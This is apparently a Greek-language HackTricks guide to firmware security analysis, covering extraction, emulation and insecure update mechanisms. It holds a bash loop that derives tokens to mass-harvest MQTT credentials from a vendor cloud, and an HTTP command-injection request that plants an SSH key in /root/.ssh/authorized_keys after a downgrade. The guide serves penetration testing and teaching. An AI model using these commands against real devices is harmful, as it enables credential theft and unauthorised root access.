# Ανάλυση Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Εισαγωγή**

### Σχετικοί πόροι


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Το firmware είναι ουσιώδες λογισμικό που επιτρέπει στις συσκευές να λειτουργούν σωστά, διαχειριζόμενο και διευκολύνοντας την επικοινωνία μεταξύ των συστατικών του υλικού και του λογισμικού με το οποίο αλληλεπιδρούν οι χρήστες. Αποθηκεύεται σε μόνιμη μνήμη, εξασφαλίζοντας ότι η συσκευή μπορεί να έχει πρόσβαση σε ζωτικές οδηγίες από τη στιγμή που θα ενεργοποιηθεί, οδηγώντας στην εκκίνηση του λειτουργικού συστήματος. Η εξέταση και η πιθανή τροποποίηση του firmware είναι κρίσιμο βήμα για τον εντοπισμό ευπαθειών ασφάλειας.

## **Συλλογή Πληροφοριών**

**Η συλλογή πληροφοριών** είναι ένα κρίσιμο αρχικό βήμα για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Αυτή η διαδικασία περιλαμβάνει τη συλλογή δεδομένων για:

- την αρχιτεκτονική CPU και το λειτουργικό σύστημα που τρέχει
- ειδικά χαρακτηριστικά του bootloader
- διάταξη υλικού και datasheets
- μετρήσεις βάσης κώδικα και τοποθεσίες πηγαίου κώδικα
- εξωτερικές βιβλιοθήκες και τύπους αδειών
- ιστορικά ενημερώσεων και ρυθμιστικές πιστοποιήσεις
- αρχιτεκτονικά διαγράμματα και διαγράμματα ροής
- αξιολογήσεις ασφάλειας και εντοπισμένες ευπάθειες

Για αυτόν τον σκοπό, εργαλεία open-source intelligence (OSINT) είναι ανεκτίμητα, όπως και η ανάλυση οποιωνδήποτε διαθέσιμων open-source software components μέσω χειροκίνητων και αυτοματοποιημένων διαδικασιών ανασκόπησης. Εργαλεία όπως [Coverity Scan](https://scan.coverity.com) και [Semmle’s LGTM](https://lgtm.com/#explore) προσφέρουν δωρεάν static analysis που μπορούν να αξιοποιηθούν για τον εντοπισμό πιθανών προβλημάτων.

## **Πρόσκτηση του Firmware**

Η απόκτηση του firmware μπορεί να προσεγγιστεί με διάφορους τρόπους, καθένας με το δικό του επίπεδο πολυπλοκότητας:

- **Απευθείας** από την πηγή (developers, κατασκευαστές)
- **Κατασκευή** του από τις παρεχόμενες οδηγίες
- **Λήψη** από επίσημους ιστότοπους υποστήριξης
- Χρήση **Google dork** queries για να βρεθούν φιλοξενούμενα αρχεία firmware
- Πρόσβαση σε **cloud storage** απευθείας, με εργαλεία όπως [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Παρεμβολή σε **updates** μέσω man-in-the-middle τεχνικών
- **Εξαγωγή** από τη συσκευή μέσω συνδέσεων όπως **UART**, **JTAG** ή **PICit**
- **Sniffing** για αιτήματα ενημέρωσης μέσα στην επικοινωνία της συσκευής
- Εντοπισμός και χρήση **hardcoded update endpoints**
- **Dumping** από τον bootloader ή το δίκτυο
- **Αφαίρεση και ανάγνωση** του chip αποθήκευσης, όταν όλα τα άλλα αποτύχουν, χρησιμοποιώντας κατάλληλα hardware εργαλεία

## Ανάλυση του firmware

Τώρα που έχετε το firmware, χρειάζεται να εξάγετε πληροφορίες για αυτό ώστε να ξέρετε πώς να το χειριστείτε. Διαφορετικά εργαλεία που μπορείτε να χρησιμοποιήσετε για αυτό:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Αν δεν βρείτε πολλά με αυτά τα εργαλεία ελέγξτε την **entropy** της εικόνας με `binwalk -E <bin>`, αν η entropy είναι χαμηλή, τότε δεν είναι πιθανό να είναι κρυπτογραφημένη. Αν είναι υψηλή, πιθανότατα είναι κρυπτογραφημένη (ή συμπιεσμένη με κάποιο τρόπο).

Επιπλέον, μπορείτε να χρησιμοποιήσετε αυτά τα εργαλεία για να εξαγάγετε **αρχεία ενσωματωμένα μέσα στο firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ή [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) για να επιθεωρήσετε το αρχείο.

### Απόκτηση του συστήματος αρχείων

Με τα προηγούμενα εργαλεία που αναφέρθηκαν όπως `binwalk -ev <bin>` θα έπρεπε να έχετε καταφέρει να **εξαγάγετε το σύστημα αρχείων**.\
Binwalk συνήθως το εξάγει μέσα σε έναν **φάκελο ονομασμένο ως ο τύπος του συστήματος αρχείων**, που συνήθως είναι ένας από τους εξής: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Χειροκίνητη εξαγωγή συστήματος αρχείων

Μερικές φορές, το binwalk **δεν θα έχει το magic byte του συστήματος αρχείων στις υπογραφές του**. Σε αυτές τις περιπτώσεις, χρησιμοποιήστε το binwalk για να **βρείτε το offset του συστήματος αρχείων και να carve το συμπιεσμένο σύστημα αρχείων** από το binary και να **εξάγετε χειροκίνητα** το σύστημα αρχείων σύμφωνα με τον τύπο του χρησιμοποιώντας τα παρακάτω βήματα.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Εκτελέστε την ακόλουθη **dd command** για carving του Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Εναλλακτικά, μπορεί επίσης να εκτελεστεί η παρακάτω εντολή.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Για squashfs (χρησιμοποιήθηκε στο παράδειγμα παραπάνω)

`$ unsquashfs dir.squashfs`

Τα αρχεία θα βρίσκονται στον φάκελο `squashfs-root` μετά.

- Για αρχεία CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Για συστήματα αρχείων jffs2

`$ jefferson rootfsfile.jffs2`

- Για συστήματα αρχείων ubifs με NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Ανάλυση του firmware

Μόλις αποκτηθεί το firmware, είναι απαραίτητο να το αποδομήσουμε για να κατανοήσουμε τη δομή του και τις ενδεχόμενες ευπάθειές του. Αυτή η διαδικασία περιλαμβάνει τη χρήση διαφόρων εργαλείων για ανάλυση και εξαγωγή σημαντικών δεδομένων από την εικόνα του firmware.

### Εργαλεία αρχικής ανάλυσης

Παρέχεται ένα σύνολο εντολών για αρχική επιθεώρηση του δυαδικού αρχείου (αναφερόμενου ως `<bin>`). Αυτές οι εντολές βοηθούν στον εντοπισμό τύπων αρχείων, στην εξαγωγή strings, στην ανάλυση δυαδικών δεδομένων και στην κατανόηση των λεπτομερειών partition και filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Για να αξιολογηθεί η κατάσταση κρυπτογράφησης της εικόνας, η **entropy** ελέγχεται με `binwalk -E <bin>`. Χαμηλή entropy υποδηλώνει έλλειψη κρυπτογράφησης, ενώ υψηλή entropy υποδεικνύει πιθανή κρυπτογράφηση ή συμπίεση.

Για την εξαγωγή των **embedded files**, συνιστώνται εργαλεία και πόροι όπως η τεκμηρίωση **file-data-carving-recovery-tools** και το **binvis.io** για επιθεώρηση αρχείων.

### Εξαγωγή του Filesystem

Χρησιμοποιώντας `binwalk -ev <bin>` συνήθως μπορείτε να εξαγάγετε το filesystem, συχνά σε έναν κατάλογο που ονομάζεται σύμφωνα με τον τύπο του filesystem (π.χ., squashfs, ubifs). Ωστόσο, όταν το **binwalk** αποτύχει να αναγνωρίσει τον τύπο του filesystem λόγω λείποντων magic bytes, είναι απαραίτητη η χειροκίνητη εξαγωγή. Αυτό περιλαμβάνει τη χρήση του `binwalk` για τον εντοπισμό του filesystem offset, και στη συνέχεια την εντολή `dd` για να εξαγάγετε το filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Στη συνέχεια, ανάλογα με τον τύπο του filesystem (π.χ., squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διάφορες εντολές για το χειροκίνητο extract των περιεχομένων.

### Filesystem Analysis

Με το filesystem εξαγμένο, ξεκινά η αναζήτηση για θέματα ασφάλειας. Δίνεται προσοχή σε insecure network daemons, hardcoded credentials, API endpoints, λειτουργίες update server, uncompiled code, startup scripts, και compiled binaries για offline ανάλυση.

**Κρίσιμες τοποθεσίες** και **στοιχεία** που πρέπει να ελεγχθούν περιλαμβάνουν:

- **etc/shadow** και **etc/passwd** για user credentials
- SSL certificates και keys στο **etc/ssl**
- Αρχεία ρυθμίσεων και scripts για πιθανές ευπάθειες
- Ενσωματωμένα binaries για περαιτέρω ανάλυση
- Κοινά IoT device web servers και binaries

Διάφορα εργαλεία βοηθούν στον εντοπισμό ευαίσθητων πληροφοριών και ευπαθειών μέσα στο filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για sensitive information search
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) για συνολική ανάλυση firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), και [**EMBA**](https://github.com/e-m-b-a/emba) για static και dynamic analysis

### Security Checks on Compiled Binaries

Τanto ο source code όσο και τα compiled binaries που βρέθηκαν στο filesystem πρέπει να εξεταστούν για ευπάθειες. Εργαλεία όπως **checksec.sh** για Unix binaries και **PESecurity** για Windows binaries βοηθούν στον εντοπισμό μη προστατευμένων binaries που θα μπορούσαν να εκμεταλλευτούν.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Πολλά IoT hubs ανακτούν την per-device configuration από ένα cloud endpoint που μοιάζει με:

- `https://<api-host>/pf/<deviceId>/<token>`

Κατά την ανάλυση firmware μπορεί να βρείτε ότι το `<token>` παράγεται τοπικά από το device ID χρησιμοποιώντας ένα hardcoded secret, για παράδειγμα:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Αυτός ο σχεδιασμός επιτρέπει σε οποιονδήποτε μάθει ένα deviceId και το STATIC_KEY να ανακατασκευάσει το URL και να τραβήξει το cloud config, συχνά αποκαλύπτοντας plaintext MQTT credentials και topic prefixes.

Πρακτική ροή εργασίας:

1) Extract deviceId from UART boot logs

- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Αναζητήστε γραμμές που εκτυπώνουν το cloud config URL pattern και το broker address, για παράδειγμα:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Ανάκτηση του STATIC_KEY και του token αλγορίθμου από το firmware

- Φορτώστε τα binaries σε Ghidra/radare2 και αναζητήστε το config path ("/pf/") ή χρήση του MD5.
- Επιβεβαιώστε τον αλγόριθμο (π.χ. MD5(deviceId||STATIC_KEY)).
- Παράξτε το token σε Bash και μετατρέψτε το digest σε κεφαλαία:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Συλλογή cloud config και MQTT credentials

- Σύνθεσε το URL και τράβηξε το JSON με curl; ανάλυσε με jq για να εξάγεις secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Κατάχρηση plaintext MQTT και αδύναμα topic ACLs (αν υπάρχουν)

- Χρησιμοποιήστε τα recovered credentials για να subscribe σε maintenance topics και αναζητήστε sensitive events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Απαριθμήστε προβλέψιμα device IDs (σε κλίμακα, με εξουσιοδότηση)

- Πολλά οικοσυστήματα ενσωματώνουν vendor OUI/product/type bytes, ακολουθούμενα από έναν διαδοχικό επίθημα.
- Μπορείτε να διατρέξετε candidate IDs, να παράγετε tokens και να ανακτήσετε configs προγραμματικά:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Σημειώσεις
- Πάντοτε λάβετε ρητή άδεια πριν επιχειρήσετε mass enumeration.
- Προτιμήστε emulation ή static analysis για να ανακτήσετε μυστικά χωρίς να τροποποιήσετε το target hardware όταν είναι δυνατό.

Η διαδικασία του emulating firmware επιτρέπει **dynamic analysis** είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση μπορεί να αντιμετωπίσει προκλήσεις λόγω εξαρτήσεων από hardware ή architecture, αλλά η μεταφορά του root filesystem ή συγκεκριμένων binaries σε μια συσκευή με συμβατή architecture και endianness, όπως ένα Raspberry Pi, ή σε ένα προ-δημιουργημένο virtual machine, μπορεί να διευκολύνει περαιτέρω δοκιμές.

### Εξομοίωση μεμονωμένων binaries

Για την εξέταση ενός μεμονωμένου προγράμματος, είναι κρίσιμο να προσδιοριστεί το endianness και η CPU architecture του προγράμματος.

#### Παράδειγμα με αρχιτεκτονική MIPS

Για να εξομοιώσετε ένα binary αρχιτεκτονικής MIPS, μπορείτε να χρησιμοποιήσετε την εντολή:
```bash
file ./squashfs-root/bin/busybox
```
Και για να εγκαταστήσετε τα απαραίτητα εργαλεία εξομοίωσης:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Για MIPS (big-endian), χρησιμοποιείται το `qemu-mips`, και για little-endian binaries, η επιλογή είναι `qemu-mipsel`.

#### Προσομοίωση αρχιτεκτονικής ARM

Για ARM binaries, η διαδικασία είναι παρόμοια, με τον emulator `qemu-arm` να χρησιμοποιείται για την προσομοίωση.

### Πλήρης προσομοίωση συστήματος

Εργαλεία όπως [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), και άλλα, διευκολύνουν την πλήρη firmware emulation, αυτοματοποιώντας τη διαδικασία και βοηθώντας στην dynamic analysis.

## Dynamic Analysis στην πράξη

Σε αυτό το στάδιο, χρησιμοποιείται είτε ένα πραγματικό είτε ένα emulated device περιβάλλον για ανάλυση. Είναι απαραίτητο να διατηρείται shell access στο OS και στο filesystem. Η emulation μπορεί να μην μιμείται τέλεια τις αλληλεπιδράσεις με το hardware, απαιτώντας περιστασιακές επανεκκινήσεις της emulation. Η ανάλυση πρέπει να επανεξετάσει το filesystem, να εκμεταλλευτεί exposed webpages και network services, και να εξερευνήσει vulnerabilities του bootloader. Οι Firmware integrity tests είναι κρίσιμες για να εντοπιστούν πιθανές backdoor vulnerabilities.

## Runtime Analysis Techniques

Η Runtime analysis περιλαμβάνει αλληλεπίδραση με μια process ή binary στο λειτουργικό του περιβάλλον, χρησιμοποιώντας εργαλεία όπως gdb-multiarch, Frida, και Ghidra για setting breakpoints και την ταυτοποίηση vulnerabilities μέσω fuzzing και άλλων τεχνικών.

## Binary Exploitation and Proof-of-Concept

Η ανάπτυξη ενός PoC για εντοπισμένες vulnerabilities απαιτεί βαθιά κατανόηση της target architecture και προγραμματισμό σε lower-level languages. Binary runtime protections σε embedded systems είναι σπάνιες, αλλά όταν υπάρχουν, τεχνικές όπως Return Oriented Programming (ROP) μπορεί να είναι αναγκαίες.

## Προετοιμασμένα λειτουργικά συστήματα για Firmware Analysis

Λειτουργικά συστήματα όπως [AttifyOS](https://github.com/adi0x90/attifyos) και [EmbedOS](https://github.com/scriptingxss/EmbedOS) παρέχουν προ-διαμορφωμένα περιβάλλοντα για firmware security testing, εξοπλισμένα με τα απαραίτητα εργαλεία.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS είναι ένα distro προοριζόμενο να βοηθήσει σας να πραγματοποιήσετε security assessment και penetration testing των Internet of Things (IoT) συσκευών. Σας εξοικονομεί πολύ χρόνο παρέχοντας ένα προ-διαμορφωμένο περιβάλλον με όλα τα απαραίτητα εργαλεία προφορτωμένα.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system βασισμένο σε Ubuntu 18.04 προφορτωμένο με firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Ακόμα και όταν ένας vendor υλοποιεί cryptographic signature checks για firmware images, **η προστασία κατά version rollback (downgrade) συχνά παραλείπεται**. Όταν ο boot- ή recovery-loader απλά επαληθεύει την υπογραφή με ένα embedded public key αλλά δεν συγκρίνει την *version* (ή έναν monotonic counter) της εικόνας που φλασάρεται, ένας attacker μπορεί νόμιμα να εγκαταστήσει ένα **παλαιότερο, ευάλωτο firmware που εξακολουθεί να φέρει έγκυρη υπογραφή** και έτσι να επανεισάγει patched vulnerabilities.

Τυπική ροή επίθεσης:

1. **Απόκτηση παλαιότερης signed image**
   * Πάρτε την από το vendor’s public download portal, CDN ή support site.
   * Εξαγάγετε την από companion mobile/desktop applications (π.χ. μέσα σε ένα Android APK υπό `assets/firmware/`).
   * Ανακτήστε την από third-party repositories όπως VirusTotal, Internet archives, forums, κ.λπ.
2. **Ανεβάστε ή σερβίρετε την image στη συσκευή** μέσω οποιουδήποτε exposed update channel:
   * Web UI, mobile-app API, USB, TFTP, MQTT, κ.λπ.
   * Πολλές consumer IoT συσκευές εκθέτουν *unauthenticated* HTTP(S) endpoints που δέχονται Base64-encoded firmware blobs, τα αποκωδικοποιούν server-side και εκκινούν recovery/upgrade.
3. Μετά το downgrade, εκμεταλλευτείτε μια vulnerability που είχε patched στη νεότερη release (π.χ. ένα command-injection filter που προστέθηκε αργότερα).
4. Προαιρετικά φλασάρετε ξανά την τελευταία image ή απενεργοποιήστε τις ενημερώσεις για να αποφύγετε τον εντοπισμό μόλις αποκτηθεί persistence.

### Παράδειγμα: Command Injection μετά από Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Στο ευάλωτο (υποβαθμισμένο) υλικολογισμικό, η παράμετρος `md5` συνενώνεται απευθείας σε εντολή shell χωρίς καθαρισμό/έλεγχο εισόδου, επιτρέποντας την έγχυση αυθαίρετων εντολών (εδώ — ενεργοποίηση πρόσβασης root με βάση κλειδί SSH). Μεταγενέστερες εκδόσεις του υλικολογισμικού εισήγαγαν ένα βασικό φίλτρο χαρακτήρων, αλλά η απουσία προστασίας από υποβάθμιση καθιστά τη διόρθωση άνευ αντικειμένου.

### Εξαγωγή υλικολογισμικού από εφαρμογές κινητών

Πολλοί προμηθευτές πακετάρουν πλήρεις εικόνες υλικολογισμικού μέσα στις συνοδευτικές εφαρμογές κινητών τους, ώστε η εφαρμογή να μπορεί να ενημερώσει τη συσκευή μέσω Bluetooth/Wi-Fi. Αυτά τα πακέτα συνήθως αποθηκεύονται χωρίς κρυπτογράφηση στο APK/APEX κάτω από μονοπάτια όπως `assets/fw/` ή `res/raw/`. Εργαλεία όπως `apktool`, `ghidra` ή ακόμη και το απλό `unzip` σας επιτρέπουν να εξαγάγετε υπογεγραμμένες εικόνες χωρίς να αγγίξετε το φυσικό hardware.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Λίστα ελέγχου για την αξιολόγηση της λογικής ενημέρωσης

* Είναι η μεταφορά/επαλήθευση ταυτότητας του *update endpoint* επαρκώς προστατευμένη (TLS + authentication);
* Συγκρίνει η συσκευή **αριθμούς έκδοσης** ή έναν **μονοτονικό anti-rollback μετρητή** πριν το flashing;
* Επαληθεύεται η image μέσα σε secure boot chain (π.χ. οι υπογραφές ελέγχονται από ROM code);
* Ο κώδικας userland εκτελεί επιπλέον ελέγχους εγκυρότητας (π.χ. επιτρεπόμενος partition map, model number);
* Επαναχρησιμοποιούν οι *partial* ή *backup* flows ενημέρωσης την ίδια λογική επικύρωσης;

> 💡  Αν οποιοδήποτε από τα παραπάνω λείπει, η πλατφόρμα πιθανότατα είναι ευάλωτη σε επιθέσεις rollback.

## Ευάλωτο firmware για εξάσκηση

Για να εξασκηθείτε στην ανακάλυψη ευπαθειών σε firmware, χρησιμοποιήστε τα παρακάτω ευάλωτα έργα firmware ως αφετηρία.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Αναφορές

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Εκπαίδευση και Πιστοποίηση

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
